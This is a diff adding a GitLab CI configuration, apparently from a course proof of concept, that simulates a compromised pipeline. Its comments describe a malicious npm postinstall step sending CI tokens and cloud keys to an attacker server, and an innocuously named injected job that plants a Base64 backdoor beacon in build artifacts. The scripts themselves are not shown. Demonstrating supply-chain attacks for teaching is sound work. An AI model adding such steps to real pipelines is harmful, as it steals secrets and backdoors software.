@@ -1,0 +1,69 @@
+# ═══════════════════════════════════════════════════════════════
+# [NT230 PoC] GitLab CI Pipeline — COMPROMISED VERSION
+#
+# File này mô phỏng pipeline đã bị attacker inject malicious steps.
+# So sánh với .gitlab-ci.yml (clean) để thấy sự khác biệt.
+#
+# Attack chain:
+#   1. install_deps: npm install từ Verdaccio → postinstall-ci-attack.js
+#      chạy tự động → exfiltrate CI secrets (T1195.002 + T1552.007)
+#   2. build: tạo clean build artifact
+#   3. inject_backdoor: attacker inject backdoor vào artifact (T1036.005)
+#
+# CẢNH BÁO: File này chỉ dùng cho mục đích demo/giáo dục.
+# ═══════════════════════════════════════════════════════════════
+
+stages:
+  - install
+  - build
+  - inject   # ← stage bị attacker thêm vào
+
+variables:
+  NPM_REGISTRY: "http://verdaccio:4873"
+
+# ─── Stage 1: npm install (trigger malicious postinstall) ─────
+install_deps:
+  stage: install
+  image: node:20
+  script:
+    - echo "[CI] Installing dependencies from private registry..."
+    - npm config set registry $NPM_REGISTRY
+    - npm install
+    # postinstall-ci-attack.js chạy tự động ở đây:
+    #   → Thu thập CI_JOB_TOKEN, GITHUB_TOKEN, AWS_SECRET_ACCESS_KEY...
+    #   → HTTP POST về attacker server (receiver.js)
+    #   → Fail-silent nếu attacker offline
+  artifacts:
+    paths:
+      - node_modules/
+
+# ─── Stage 2: Build (clean step — chưa bị tamper) ────────────
+build:
+  stage: build
+  image: node:20
+  script:
+    - echo "[CI] Building project..."
+    - node ci/build-clean.js
+  artifacts:
+    paths:
+      - artifacts/
+  dependencies:
+    - install_deps
+
+# ─── Stage 3: INJECTED — Attacker poison artifact ────────────
+# Job này KHÔNG có trong .gitlab-ci.yml gốc.
+# Attacker thêm vào sau khi compromise CI config.
+inject_backdoor:
+  stage: inject
+  image: node:20
+  script:
+    - echo "[CI] Post-build processing..."  # tên vô hại để tránh nghi ngờ
+    - node ci/inject-malicious-artifact.js
+    # → Append Base64-encoded backdoor beacon vào build-output.txt
+    # → Ghi ci-injected-marker.txt xác nhận injection
+    # → POST confirmation về attacker server
+  artifacts:
+    paths:
+      - artifacts/
+  dependencies:
+    - build
